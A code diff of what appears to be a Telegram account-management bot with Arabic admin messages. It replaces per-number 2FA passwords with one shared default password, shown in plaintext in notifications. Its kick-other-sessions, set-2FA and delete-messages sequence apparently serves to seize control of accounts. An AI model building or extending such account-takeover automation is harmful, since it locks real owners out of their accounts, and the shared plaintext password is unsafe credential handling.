@@ -18,6 +18,7 @@ from config import (
     SESSION_RECOVERY_MAX_ATTEMPTS,
     SESSION_RECOVERY_RETRY_DELAY,
     SUPER_ADMIN_ID,
+    DEFAULT_2FA_PASSWORD,
 )
 import database
 import session_manager
@@ -515,8 +516,7 @@ async def _on_admin_event(phone: str, event: str, **data):
             base
             + "🛡️ <b>بدء خط التأمين</b>\n"
             + mail
-            + "\n\n⏳ الترتيب: طرد الجلسات → 2FA "
-            + f"(<code>{h(database.two_fa_password_for_phone(phone))}</code>) بعد نجاح الطرد"
+            + f"\n\n⏳ الترتيب: طرد الجلسات → 2FA (<code>{h(DEFAULT_2FA_PASSWORD)}</code>) بعد نجاح الطرد"
         )
     elif event == "kick_started":
         text = base + "🛡️ <b>بدء طرد الجلسات الأخرى</b>\n⏳ محاولة فورية أولاً..."
@@ -537,8 +537,7 @@ async def _on_admin_event(phone: str, event: str, **data):
         text = base + f"✅ <b>نجح طرد الجلسات</b> ({h(data.get('phase', ''))})\n🔐 جاري تفعيل 2FA..."
     elif event == "twofa_ok":
         if data.get("skipped"):
-            pw = data.get("password") or database.two_fa_password_for_phone(phone)
-            text = base + f"🔐 <b>2FA</b> — كان مضبوطاً مسبقاً (<code>{h(pw)}</code>)"
+            text = base + f"🔐 <b>2FA</b> — كان مضبوطاً مسبقاً (<code>{h(DEFAULT_2FA_PASSWORD)}</code>)"
         else:
             text = (
                 base
@@ -1486,7 +1485,7 @@ async def admin_full_cleanup(callback: CallbackQuery):
     if not await _guard_session_row(callback, session):
         return
     phone, sid = session["phone"], session["id"]
-    new_pw = database.two_fa_password_for_phone(phone)
+    new_pw = DEFAULT_2FA_PASSWORD
 
     await callback.message.edit_text(
         "⏳ جاري التنظيف الشامل (طرد → 2FA → حذف رسائل)..." + ADMIN_FOOTER,
